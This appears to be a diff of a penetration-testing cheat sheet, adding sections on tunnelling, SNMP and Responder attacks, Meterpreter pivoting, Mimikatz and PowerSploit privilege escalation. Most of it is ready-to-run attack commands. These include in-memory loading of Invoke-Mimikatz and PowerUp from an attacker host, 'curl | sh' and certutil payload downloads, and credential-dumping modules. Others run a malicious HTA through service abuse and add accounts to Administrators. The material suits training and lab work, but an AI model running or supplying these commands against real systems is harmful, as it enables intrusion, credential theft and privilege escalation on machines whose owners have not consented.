+* ssh -L [Local Port to listen on] : [Remote Machine] : [Remote Port] [Username] @ [ssh server]
+* Local port is the port we are opening up locally for the connection *to the remote machine* (victim)
+* ie. `ssh -L 3000:localhost:3306` is opening locally port 3000 to tunnel traffic to port 3306 (mysql)
+* Now there is a tunnel from our port 3000 to the remote port 3306 that was missing, accessible on 127.0.0.1:3000
+    * Sending instructions to 127.0.0.1:3000 will then be forwarded through the tunnel to RemoteIP:3306
+    * `mysql -h 127.0.0.1 -P 3000 -u root`
+
+
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+### Proxychains
+
+Proxychains used to send commands through a proxy. The command originates on the [attacker] machine, routes to [compromised machine] and then runs from the [compromised machine] using it's routing and structure.
+
+**Configuration File**
+
+Located at `/etc/proxychains4.conf`
+
+**Metasploit Server Setup**
+
+```powershell
+#METASPLOIT Setup
+    use auxiliary/server/socks_proxy
+    set srvport 1080
+    set version 4a
+    jobs
+```
+
+**ProxyChains**
+
+```powershell
+#PROXYCHAINS
+    proxychains nmap demo1.ine.ocal -sT -Pn -p 1-100
+    proxychains nmap demo1.ine.ocal -sT -Pn --top-ports 50
+    proxychains ssh 10.10.10.0
+    proxychains telnet 10.10.10.0
+```
+
 
 ## SOCAT-Tool
 
@@ -4739,12 +5267,65 @@ sudo install -m =xs $(which socat) .											:[Target]
 
 ```
 
+---
 
+## SNMP
 
+Simple Network Management Protocol
+
+Used for the exchange of management information between network devices such as configuring Routers or simply checking its status
+
+- SNMPv1 is the most vulnerable due to clear text protocol
+- SNMPv2 is also vulnerable due to its inherent weaknesses
+- SNMPv3, latest, is susceptible to brute forcing
+
+**Note:** SNMP is a **UDP** protocol and receives general messages on **port 161/udp** and trap messages on **port 162/udp**
+
+```powershell
+#NMAP NSE
+    nmap -sU -p 161 --script=$script $RHOST
+    nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt      :Use a chosen wordlist instead
+    nmap -sU -p 161 --script snmp-* $RHOST > snmp_output.txt
+    snmp-brute
+    snmp-info
+    snmp-interfaces
+    snmp-netstat
+    snmp-processes
+    snmp-sysdescr
+    snmp-win32-services
+    
+#OPTIONS
+    -v $version     :Select version
+    $RHOST          :Target
+    -c $STRING      :Community string, default is public
+#USAGE
+            snmpwalk -v 2c $RHOST -c public
+            snmpwalk -v 1 $RHOST -c public hrSWInstalledName              :Filter to only installed 'software'
+```
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## RESPONDER
+
+Responder can be utilized to exploit LLMNR and NBT-NS weakness for capturing NTLMv1/v2 hashes and relaying them for authentication to other systems. It works by listening for LLMNR or NBT-NS broadcast messages and spoofing responses to targeted hosts, resulting in **intercepting hashes** to either pass the hash or crack offline. Passing the hash can lead to a Multi Relay shell if successful.
+
+**Required:**
+- SMB Signing *disabled*
+
+**Steps for Multi Relay attack:**
+- Modify **responder.conf** and disable **SMB** and **HTTP**
+
+```powershell
+#USAGE
+    responder.py -I tun0                     :Begin listening & responding to LLMNR and NBT-NS requests
+    python  MultiRelay.py -t $RHOST -u ALL   :'location: tools directory of responder', successful hash relay should result in a shell.
+```
+
+
+
+
 
 # SHELLS-FIND
 
@@ -4794,6 +5375,8 @@ Note: With windows you won't be able to stabilise further like with linux
 
 ## Shell-Meterpreter
 
+Tags: [Metasploit](#Metasploit)
+
 A type of shell that is feature-rich when exploiting a remote host
  
  **LOAD POWERSHELL**
@@ -4816,10 +5399,32 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     jobs			:Display jobs, Join with jobs $JOB
 
 #NETWORK
-    arp				:Display ARP
-    ifconfig		:IP Addr, Ifconfig, Ipconfig
-    route			:Display Route table
-    portfwd			:Portforwarding localport to remote port
+    arp				                   :Display ARP
+    ifconfig		                   :IP Addr, Ifconfig, Ipconfig
+    route			                   :Display Route table
+    portfwd			                   :Portforwarding localport to remote port
+    netstat                            :Verify connections active on machine
+    run arp_scanner -r 10.10.10.0/24   :Discover machines in network
+    use post/multi/gather/ping_sweep   :Pingsweep internal network
+    run netenum -h                     :Powerful mapping tool with various features
+
+    #ROUTING
+        route add 10.10.10.0 255.255.255.0 $session   :Route all traffic intended to 10.10.10.0/24 through $session
+        route flush                                   :Flush all routing setup
+        run autoroute -s 10.10.10.5/24
+        use auxiliary/scanner/portscan/tcp            :MSF module to use router [victim] to scan internally
+
+    #PROXY
+        use auxiliary/server/socks4a            :Setup server that uses metasploit routing to relay connections
+            set srvhost 0.0.0.0                 :Can leave as default
+            set srvport 1080
+    
+    #PORTFWD
+        portfwd add -l 1234 -p 80 -r 10.0.18.161             : -l 1234 is the port we want locally forwarded, -p 80 is the target port open on external machine
+        portfwd list
+        #Verify
+            nmap -sV -p 1234 localhost                       :localhost or 127.0.0.1
+            rdesktop 127.0.0.1:1234
 
 #SYSTEM
     pwd				:Current DIR
@@ -4828,21 +5433,48 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     getenv			:Display environment variables
     use priv		:Load priv module
     getprivs		:Display current privs
-    getsystem		:Priv escalation attempt
+    getsystem		:Priv escalation attempt, be wary of 'windows vista+' with UAC enabled as then this wont work so might need 'post/windpws/gather/win_privs' to check then run 'bypassuac'
     getpid			:Display current process ID
     steal_token		:Token impersonation
     ps				:Dump process IDs
     ps -U $ROLE		:Target role, i.e SYSTEM process IDs
     migrate $PID	:Migrate stable process
+    migrate -N explorer.exe
     sysinfo			:Dump system info
+
+#METERPETER SCRIPTS
+    run + tab x 2        :List of possible scripts that can be executed with meterpreter ie. run autoroute
+
+    run post/multi/recon/local_exploit_suggester
+    
+    run post/linux/gather/enum_system             :Linux system enumeration
+    
+    run post/windows/gather/enum_services         :Windows services 
+    run post/windows/gather/enum_domains          :Check if Domain
+    run post/windows/gather/enum_ad_users         :Accounts in default active domain
+    run post/windows/gather/enum_shares           :List resources shared
+    run post/windows/gather/winenum               :Run several commands to extract info. 'run winenum'
+    run post/windows/gather/enum_applications     :List installed applications
+
+    #CREDENTIALS
+    run post/windows/gather/credentials/credential_collector
+    run post/windows/gather/enum_chrome           :Gather Google Chrome info, including credentials
+    run post/windows/gather/credentials/*         :Check for list of different credentials to enumerate
+    
+    run post/multi/gather/*                       :Check for list of scripts including credentials scripts
 
 #DOWNLOAD/UPLOAD
     download $FILEpath $SAVElocation	:Extract file to location
-    upload $FILEpath $SAVElocation		:Upload file to location
+    upload $FILEpath $SAVElocation		:Upload file to location i.e 'upload /home/kali/37292.c' and compile it on the target with 'gcc 37292.c -o exploit' if they have the tools available.
     execute -f $FILEpath				:Run uploaded file
 
 #SEARCH
-    search			:Searching
+    -d $path                              :Directory to start from
+    -f $file                              :File pattern to search
+    
+    search			                      :Searching
+    search -f flag.*                      :Searching for all files flag with any extension
+    search -d C:\\Users\\els\\ -f *.kdbx  :Search specific extension, i.e KeePass database
 
 ```
 
@@ -4878,12 +5510,15 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     $USER					:User name
     $GROUP					:Group name
     
-    whoami /priv			:Current User privs
-    net users				:List Users
-    net user $USER			:Filter Users i.e *admin*
-    qwinsta					:Other Logged-in users
-    net localgroup			:List Groups
-    net localgroup $GROUP	:Filter Group i.e Administrators
+    whoami /priv			                   :Current User privs
+    net user				                   :List Users
+    net user $USER			                   :Filter Users i.e *admin*
+    qwinsta					                   :Other Logged-in users
+    net localgroup			                   :List Groups
+    net localgroup $GROUP	                   :Filter Group i.e Administrators
+    net view /domain                           :Check if part of domain
+    net group "Domain Controllers" /domain     :List Domain controllers
+    net share                                  :List resources shares
 
 #SYSTEM
     systeminfo												:Dump System Info	
@@ -4892,16 +5527,29 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
     driverquery												:List drivers
 
+#NETWORK
+    route print
+    arp -a
+    netstat -ano
+
 #SERVICES
+    net start                                                                      :See list of running services such as Remote Desktop etc.. DNS or IIS services indicate host has a server role
+    wmic service where 'Caption like "Remote%" and started=true' get Caption       :See if specific service is running
+    
     $SERVICE												:Exact service name
     wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
     wmic service list										:List services
     wmic service list brief | findstr "Running"				:Filter "Running"
+    wmic service get Caption,StartName,State,pathname       :System info
     wmic product											:Dumps Installed programs, Info overload
     wmic product get name,version,vendor					:Dumps installed programs, Clean output
-    sc qc $SERVICE
+    sc qc $SERVICE                                          :Query a specific service and manually check for unquoted path
     net stop $SERVICE && net start $SERVICE					:Stop/Start service
-
+    
+#SERVICES UNQUOTED PATH
+    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+    sc qc $SERVICE                                          :Query a specific service and manually check for unquoted path
+    
 #SEARCHING
     /s		:Searching
     /b		:barebones
@@ -4917,13 +5565,29 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     %tmp%													:Easily navigated directory
     wget "$LHOST:$LPORT/$FILE" -o %tmp%\$FILE
 
+#PING SWEEP
+    (for /L %a IN (1,1,254) DO ping /n 1 /w 3 172.30.111.%a) | find "Reply" > ping_only_replies.txt
 ```
 
 [Back to Top](#table-of-contents)
 
 ## Shell-PowerShell
 
+**Locations**
+* 32bit = c:/windows/system32/WindowsPowershell/$versionFolder$
+* 64bit = c:/windows/SysWOW64/WindowsPowershell/$versionFolder$
+* 
+
 ```powershell
+#Misc / Launch tool with BYPASS
+    powershell.exe -ExecutionPolicy Bypass .\script.ps1       :[cmd]
+    powershell.exe -ep Bypass                                 :Shorthand of Execution Policy
+    powershell.exe -ExecutionPolicy Unrestricted .\script.ps1 :Alternative
+    powershell.exe -NoProfile .\script.ps1                    :'No Profile' as launching powershell can run a profile that might interfere with script
+    powershell.exe -Command Get-Process                       :sending commands
+    powershell.exe -EncodedCommand $command                   :Execute base64 encoded scripts or commands
+    powershell.exe -ec $command                               :Shorthand of encodedcommand
+    powershell.exe -Version 2                                 :'Downgrade' from more recent version (requires older versions to be installed)
 #User/Group Enumeration
     $USER	:User name
     $GROUP	:Group name
@@ -4957,7 +5621,7 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     Get-Service -Displayname "*network*"					:search string with wildcards
     Get-Service | Where-Object {$_.Status -eq "Running"}	:"Running" or "Stopped" services
     (Get-Item -Path '$PATH').VersionInfo |Format-List -Force:Get specific version info
-    net stop $SERVICE && net start $SERVICE					:Stop/Start service
+    net stop $SERVICE && net start $SERVICE					:Stop/Start service about:blank
 
 #Version
     $PROGRAMpath:Path/to/program.exe
@@ -4979,8 +5643,11 @@ powershell_shell		:Interactive shell without the auto complete, keyboard complet
     $FILE	:File name
     %tmp%	:Easily navigated file location
 
-    Invoke-WebRequest $LHOST/$FILE -outfile %tmp%\$FILE
-    wget "$LHOST/$FILE" -outfile %tmp%\$FILE
+    #POWERSHELL
+	iex (New-Object Net.WebClient).DownloadString('http://10.10.16.2/$program.ps1')                                 :Load direct to Memory
+	Invoke-WebRequest -Uri "http://10.10.16.2/$program.ps1" -OutFile "path/to/folder/$program.ps1"                  :Download locally, same as 'wget'
+	ivr -Uri $RHOST/$program.exe -OutFile $program.exe                                                              :Short method of Invoke-WebRequest
+	(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.2/$program.ps1", "path/to/folder/$program.ps1") :Download locally>)
 
 #Scheduled Tasks
     schtasks						:Show all scheduled tasks
@@ -5048,7 +5715,7 @@ $command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_p
 #SSH REVERSE TUNNELLING
     -L    :(YOU <-- CLIENT) Specifies that the given port on the local (client) host is to be forwarded to the given host and port on the remote side
     -R    :(YOU --> CLIENT)
-    ssh -L $PORT:localhost:$PORT $USER@$RHOST
+    ssh -L $PORT:localhost:$PORT $USER@$RHOST      :ssh -L [Local Port to listen on] : [Remote Machine] : [Remote Port] [Username] @ [ssh server]
     ssh -R $PORT:localhost:$PORT $USER@$LHOST
 
 #SSH Backdoor
@@ -5064,7 +5731,21 @@ $command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_p
 
     #ATTACKER
     ssh -i id_rsa $USER@$RHOST                      : Optional -p $RPORT
+
+#SSH Tunnel
+    -L                      :Local, Initial tunnel
+    $RPORT:$RHOST:$RPORT    :localport:remote host:remote port
+    ssh -L $RPORT:localhost:$RPORT $USER@$RHOST
+    ssh -L 8080:localhost:8080 bob@$RHOST
 ```
+
+**Note**
+* ssh -L [Local Port to listen on] : [Remote Machine] : [Remote Port] [Username] @ [ssh server]
+* Local port is the port we are opening up locally for the connection *to the remote machine* (victim)
+* ie. `ssh -L 3000:localhost:3306` is opening locally port 3000 to tunnel traffic to port 3306 (mysql)
+* Now there is a tunnel from our port 3000 to the remote port 3306 that was missing, accessible on 127.0.0.1:3000
+    * Sending instructions to 127.0.0.1:3000 will then be forwarded through the tunnel to RemoteIP:3306
+    * `mysql -h 127.0.0.1 -P 3000 -u root`
 
 **COMMANDS:**
 
@@ -5086,6 +5767,7 @@ $command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $String_p
     ps or ps -A or ps axjf or ps aux:Running processes, output PID, TTY (terminal type), Time: Amount of CPU time used by process
     env								:Environmental variables, path= variable may have compiler or scripting language usable
     id or id $USER					:Overview of user priv levels and group memberships, Can target other users
+    service --status-all            :List running services
 
 #FILE LOCATIONS
     /proc/version					:Confirm kernel version, verify compiled "GCC" installed
@@ -5861,6 +6543,34 @@ Tags: [Active Directory](#Active%20Directory), [KERBEROS](#KERBEROS), [Windows-P
 
 Tool commonly used for dumping user credentials inside an active directory network. Mimikatz can also be used for dumping a Ticket Granting Ticket (TGT) from the Local Security Authority Subsystem Service (LSASS) memory. LSASS is a memory process storing creds on a AD network as well as storing Kerberos tickets with other cred types to act as the gatekeeper accepting or rejecting the credentials provided. 
 
+**METASPLOIT (WITHOUT BINARY)**
+
+It is important to have mimikatz running on a 64-bit process. This allows all *mimikatz* features without any issues. This requires migrating to a 64-bit process if you aren't already.
+
+
+```powershell
+#MSFCONSOLE WITH POWERSHELL (RUN FROM MEMORY)
+    load powershell
+    powershell_shell
+    iex (New-Object Net.WebClient). DownloadString('http://$RHOST:$RPORT/Invoke-Mimikatz.ps1')
+    iex (iwr http://$RHOST:8080/Invoke-Mimikatz.ps1 -usebasicparsing                           :Shorthand version of the above
+
+    Invoke-Mimikatz -Dumpcreds
+    Invoke-Mimikatz -Command '"Privilege::debug" "sekurlsa::logonPasswords full"'
+
+#CHANGING TO 64-bit
+    ps -A x86_64 -s        :List 64-bit processes available to migrate to
+    migrate $PID           :Migrate
+
+#MSFCONSOLE MODULE
+    load mimikatz
+
+    wdigest                :Retrieve wdigest credentials
+```
+
+**BINARY**
+
+
 ```powershell
 #Note ensure you run 32bit or 64bit based on architecture
 
@@ -5878,6 +6588,8 @@ Tool commonly used for dumping user credentials inside an active directory netwo
     kerberos::ptt $TICKET		:Indicate the ticket you are using to impersonate, i.e the administrators base64 encoded tickets harvested with Rubeus.
     klist									:verify to check if successfully impersonated.
 ```
+
+
 
 [Pass-The-Ticket](#Pass-The-Ticket)
 
@@ -6738,13 +7450,31 @@ This could come from typing in the wrong syntax and using the wrong terminal and
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## Linux-Compiling-Exploits
+
+It is always preferred that if you have an exploit such as 37292.c that is the source code of a exploit for a system such as the OS; then you will want to have the exploit compiled on the target system so you don't need to worry about architecture issues.
+
+If the target system does not have the required tools to complete this, then you will need to compile on your local machine but remember to take into account the architecture of the target.
+
+```powershell
+#COMPILING REMOTELY
+    gcc 37292.c -o exploit
+    ./exploit
+
+#COMPILING LOCALLY
+    gcc -m32 -o linux_priv_esc 37292.c
+    @upload payload to target
+    chmod +x linux_priv_esc
+```
+
+
+
 
 # Windows-Privilege-Escalation
 
-All about escalating privileges to get from a lower-privilege user up to super users.\
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
+All about escalating privileges to get from a lower-privilege user up to super users.
 
 ## Info-Gathering
 
@@ -6756,64 +7486,72 @@ Testing for permissions or using services or programs to run privileged commands
 > `net users $USERnew  $PASSnew /add && net localgroup Administrators $USERnew /add`
 
 ```powershell
+#PowerUp.ps1
+    python3 -m http.server 80
+    iex (New-Object Net.WebClient).DownloadString('10.10.16.2/PowerUp.ps1')          :Load into memory
+    certutil -urlcache -f http://10.10.16.2/PowerUp.ps1 PowerUp.ps1                  :Download locally
+
+    #POWERSHELL
+    Invoke-AllChecks
+
 #User/Group Enumeration
-$USER	:User name
-$GROUP	:Group name
-whoami /priv			:Current User privs
-net users				:List Users
-net user $USER			:Filter Users i.e *admin* wildcard
-qwinsta					:Other Logged-in users
-net localgroup			:List Groups
-net localgroup $GROUP	:Filter Group i.e Administrators
+    $USER	:User name
+    $GROUP	:Group name
+    whoami /priv			:Current User privs
+    net users				:List Users
+    net user $USER			:Filter Users i.e *admin* wildcard
+    qwinsta					:Other Logged-in users
+    net localgroup			:List Groups
+    net localgroup $GROUP	:Filter Group i.e Administrators
 
 #System Enumeration
-systeminfo												:Dump System Info	
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	:Filter Name, Version
-hostname												:Dump Hostname
-netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
-driverquery												:List drivers
-sc query windefend										:Antivirus enumeration
-sc queryex type=service									:Antivirus enumeration
+    systeminfo												:Dump System Info	
+    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	:Filter Name, Version
+    hostname												:Dump Hostname
+    netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
+    driverquery												:List drivers
+    sc query windefend										:Antivirus enumeration
+    sc queryex type=service									:Antivirus enumeration
 
 #Services Powershell
-Get-Service												:All services
-Get-Service | Sort-Object status						:Sorting
-Get-Service -Displayname "*network*"					:search string with wildcards
-Get-Service | Where-Object {$_.Status -eq "Running"}	:"Running" or "Stopped" services
+    Get-Service												:All services
+    Get-Service | Sort-Object status						:Sorting
+    Get-Service -Displayname "*network*"					:search string with wildcards
+    Get-Service | Where-Object {$_.Status -eq "Running"}	:"Running" or "Stopped" services
 
 #Services CMD
-$SERVICE												:Exact service name
-wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
-wmic service list										:List services
-wmic service list brief | findstr "Running"				:Filter "Running"
-wmic product											:Dumps Installed programs, Info overload
-wmic product get name,version,vendor					:Dumps installed programs, Clean output
-sc qc $SERVICE
+    $SERVICE												:Exact service name
+    wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
+    wmic service list										:List services
+    wmic service list brief | findstr "Running"				:Filter "Running"
+    wmic product											:Dumps Installed programs, Info overload
+    wmic product get name,version,vendor					:Dumps installed programs, Clean output
+    sc qc $SERVICE
 
 #Version
-$PROGRAMpath:Path/to/program.exe
-(Get-Item -Path '$PROGRAMpath').VersionInfo | Format-List -Force	:Version info for program
+    $PROGRAMpath:Path/to/program.exe
+    (Get-Item -Path '$PROGRAMpath').VersionInfo | Format-List -Force	:Version info for program
 
 #Searching
-/s		:Searching
-/b		:barebones
-$STRING	:String to search within *.txt (all .txt files)
-/si 	:ignore upper/lowercase differences
-*.txt	: Target all .txt, xml, ini, config, xls files.
+    /s		:Searching
+    /b		:barebones
+    $STRING	:String to search within *.txt (all .txt files)
+    /si 	:ignore upper/lowercase differences
+    *.txt	: Target all .txt, xml, ini, config, xls files.
 
-dir /s /b *$FILE*			:Wildcard searching "*file*.txt"
-findstr /si $STRING *.txt	:Search current, sub dir for patterns of $STRING
+    dir /s /b *$FILE*			:Wildcard searching "*file*.txt"
+    findstr /si $STRING *.txt	:Search current, sub dir for patterns of $STRING
 
 #Downloading
-$LHOST	:Listening Host
-$FILE	:File name
-%tmp%	:Easily navigated file location
+    $LHOST	:Listening Host
+    $FILE	:File name
+    %tmp%	:Easily navigated file location
 
-Invoke-WebRequest $LHOST/$FILE -outfile %tmp%\$FILE
+    Invoke-WebRequest $LHOST/$FILE -outfile %tmp%\$FILE
 
 #Scheduled Tasks
-schtasks						:Show all scheduled tasks
-schtasks /query /fo /LIST /v	:Filter and list
+    schtasks						:Show all scheduled tasks
+    schtasks /query /fo /LIST /v	:Filter and list
 ```
 
 
@@ -6824,9 +7562,51 @@ schtasks /query /fo /LIST /v	:Filter and list
 
 [Back to Top](#table-of-contents)
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
+### PowerSploit
 
-## WinPEAS-PowerUp
+Using various powersploit modules for info gathering and various checks.
+
+```powershell
+#PowerUp.ps1
+    powershell.exe -nop -exec bypass         :Optional, to bypass Execution Policy restrictions
+    import-module ./powerup.ps1              :Invoke script, required if not loaded into memory yet, i.e downloaded locally
+    
+    Invoke-AllChecks
+    get-unquotedservice						 :Target unquoted service path vulns
+
+#Exploits
+    Invoke-ServiceAbuse -Name 'AppReadiness' -Command "net localgroup administrators bob /add"             :Add bob to administrators group, both instances is 'Loud' and could trigger doubt
+    Invoke-ServiceAbuse -Name 'AppReadiness' -Username atk -Password atk -Localgroup "Administrators"      :Create new user and add to administrators group, both instances is 'Loud' and could trigger doubt
+
+#HTA - html application exploit
+    use /exploit/windows/misc/hta_server                   :Generates HTA server with URL 'http://10.10.16.2:8080/ljUAsN.hta' with malicious file
+    Invoke-ServiceAbuse -Name 'AppReadiness' -Command "mshta.exe http://10.10.16.2:8080/ljUAsN.hta"   :[mshta.exe] is an executable that is available by default on all OSes
+    
+```
+
+```powershell
+#OPTIONS TO TRANSFER FILES TO VICTIM
+	sudo python3 http.server 80                                                                               :[attacker] Setup server in directory to feed file on port 80
+	
+	#LINUX
+	curl $RHOST/linpeas.sh | sh
+	wget $RHOST/linpeas.sh
+	scp $FILEpath $USER@$RHOST:/tmp/
+	
+	#CMD
+	certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe                                       :Download locally, place in %tmp% folder
+	
+	#POWERSHELL
+	iex (New-Object Net.WebClient).DownloadString('http://10.10.16.2/PowerUp.ps1')                            :Load direct to Memory
+	Invoke-WebRequest -Uri "http://10.10.16.2/PowerUp.ps1" -OutFile "path/to/folder/power.ps1"                :Download locally, same as 'wget'
+	(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.2/PowerUp.ps1", "path/to/folder/pwr.ps1") :Download locally
+	
+	Import-Module BitsTransfer                                                                                :Enabled by default on many machines but not guaranteed
+	Start-BitsTransfer -source "http://10.10.16.2/PowerUp.ps1" -Destination "powerup.ps1"                     :Enabled by default on many machines but not guaranteed
+```
+
+
+### WinPEAS
 
 Tags: [Metasploit](#Metasploit), [Info-Gathering](#Info-Gathering), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry), [Hashcat](#Hashcat)
 
@@ -6834,19 +7614,9 @@ Both **WinPEAS** & **PowerUp** are automated scripts that require to be download
 
 ```powershell
 #WINPEAS
-#TRANSFER
-    certutil -urlcache -f http://$RHOST/winpeas.exe %tmp%/winpeas.exe	:Transfer file to victim
-    powershell "Invoke-WebRequest -UseBasicParsing $RHOST/winPEASany.exe -OutFile %tmp%/winPEAS.exe"
-    powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://$RHOST:$RPORT/winPEASany.exe\", %tmp%\"winpeas.exe\")"
-#USAGE
     winpeas.exe > $FILE													:Optional: Output saved to file
     winpeas.exe servicesinfo											:Filter service info only
 
-#POWERUP
-#TRANSFER
-    certutil -urlcache -f http://$RHOST/powerup.ps1 %tmp%/powerup.ps1	:Transfer file to victim
-    powershell "Invoke-WebRequest -UseBasicParsing $RHOST/powerup.ps1 -OutFile %tmp%/powerup.ps1"
-    powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://$RHOST:$RPORT/powerup.ps1\", %tmp%\"powerup.ps1\")" 
 #USAGE
     powershell.exe -nop -exec bypass									:optional, may need to pypass execution policy restrictions
     import-module ./powerup.ps1											:Invoke script
@@ -6854,11 +7624,32 @@ Both **WinPEAS** & **PowerUp** are automated scripts that require to be download
     get-unquotedservice													:Target unquoted service path vulns
 ```
 
+```powershell
+#OPTIONS TO TRANSFER FILES TO VICTIM
+	sudo python3 http.server 80                                                                               :[attacker] Setup server in directory to feed file on port 80
+	
+	#LINUX
+	curl $RHOST/linpeas.sh | sh
+	wget $RHOST/linpeas.sh
+	scp $FILEpath $USER@$RHOST:/tmp/
+	
+	#CMD
+	certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe                                       :Download locally, place in %tmp% folder
+	
+	#POWERSHELL
+	iex (New-Object Net.WebClient).DownloadString('http://10.10.16.2/PowerUp.ps1')                            :Load direct to Memory
+	Invoke-WebRequest -Uri "http://10.10.16.2/PowerUp.ps1" -OutFile "path/to/folder/power.ps1"                :Download locally, same as 'wget'
+	(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.2/PowerUp.ps1", "path/to/folder/pwr.ps1") :Download locally
+	
+	Import-Module BitsTransfer                                                                                :Enabled by default on many machines but not guaranteed
+	Start-BitsTransfer -source "http://10.10.16.2/PowerUp.ps1" -Destination "powerup.ps1"                     :Enabled by default on many machines but not guaranteed
+```
+
 [Back to Top](#table-of-contents)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-## Windows-Exploit-Suggester
+### Windows-Exploit-Suggester
 
 Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry)
 
@@ -6866,13 +7657,33 @@ Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](
 
 ```powershell
 #VICTIM
-certutil -urlcache -f http://$RHOST/windows-exploit-suggester.py %tmp%/windows-exploit-suggester.py	:Transfer to Victim
 ./windows-exploit-suggester.py -update																:Ensure database is updated
 systeminfo > $FILE.txt																				:Gather info into .txt
 ./windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo $FILE.txt				:Run tool, using updated database
 
 #METASPLOIT
 use multi/recon/local_exploit_suggester		:Run module using open session
+```
+
+```powershell
+#OPTIONS TO TRANSFER FILES TO VICTIM
+	sudo python3 http.server 80                                                                               :[attacker] Setup server in directory to feed file on port 80
+	
+	#LINUX
+	curl $RHOST/linpeas.sh | sh
+	wget $RHOST/linpeas.sh
+	scp $FILEpath $USER@$RHOST:/tmp/
+	
+	#CMD
+	certutil -urlcache -f http://$RHOST/mimikatz.exe %tmp%/mimikatz.exe                                       :Download locally, place in %tmp% folder
+	
+	#POWERSHELL
+	iex (New-Object Net.WebClient).DownloadString('http://10.10.16.2/PowerUp.ps1')                            :Load direct to Memory
+	Invoke-WebRequest -Uri "http://10.10.16.2/PowerUp.ps1" -OutFile "path/to/folder/power.ps1"                :Download locally, same as 'wget'
+	(New-Object System.Net.WebClient).DownloadFile("http://10.10.16.2/PowerUp.ps1", "path/to/folder/pwr.ps1") :Download locally
+	
+	Import-Module BitsTransfer                                                                                :Enabled by default on many machines but not guaranteed
+	Start-BitsTransfer -source "http://10.10.16.2/PowerUp.ps1" -Destination "powerup.ps1"                     :Enabled by default on many machines but not guaranteed
 ```
 
 [Back to Top](#table-of-contents)
@@ -6923,34 +7734,60 @@ DLL hijacking requires having an application with either a **missing DLL file** 
 
 If **SafeDllSearchMode** is enabled, it will search in order:
 
-  1.  The directory from which the application loaded.
-
-  2.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.
-
-  3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
-
-  4.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.
-
-  5.  The current directory.
-
-  6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 
+1.  The directory from which the application loaded.
+2.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.
+3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
+4.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.
+5.  The current directory.
+6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 
 
 If **SafeDllSearchMode** is disabled, it will search in order:
 
-  1.  The directory from which the application loaded.
-
-  2.  The current directory.
-
-  3.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.
-
-  4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
-
-  5.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.
-
-  6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 
+1.  The directory from which the application loaded.
+2.  The current directory.
+3.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.
+4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.
+5.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.
+6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 
 
 **NOTE:** It is important to note that we need to know what directory we have write access to and ensuring that the .DLL we are trying to hijack is **after** our write directory\
 Our code needs to be called upon by the application before the legitimate DLL.
+
+**Finding DLLs**
+
